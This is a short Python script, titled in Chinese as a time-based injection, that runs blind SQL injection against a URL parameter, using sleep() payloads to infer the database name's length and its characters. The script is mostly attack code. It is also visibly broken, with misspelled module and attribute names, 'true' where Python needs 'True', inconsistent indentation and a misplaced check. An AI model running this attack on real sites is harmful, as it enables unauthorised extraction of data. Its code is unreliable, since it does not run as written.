#延时注入
```
import requests
import string

url=" "

def timeOut(url): #定义一个timeOut的函数

	try:
                      
                    res=request.get(url,timeout=3)
		rest.text
	  except Exception as e:
		return "timeout"

dbNameLen=0
while true:
	dbNameLen+=1
	dbNameLen_url=url+"?id=1'+and+if(length(database())="+str(dbNameLen)+",sleep(5),1)--+"

	if "timeout" in timeOut(dbNameLen_url):
	print("The len of dbNmae:"+str(dbNameLen))
	break

	if dbNameLen==30:
	print("error")
	break
	
dbName=" "
for i in range(1,dbNameLen+1):
	for char in string.acsii_lowercase:
		dbName_url=url+"?id=1'+and+if(substr(database(),"+str(i)+",1)='"+char+"',sleep(5),1)--+"  
	if  "timeout" in timeOut(dbName_url):
		dbName+=char
		print("The dbName:"+dbName)
		break
```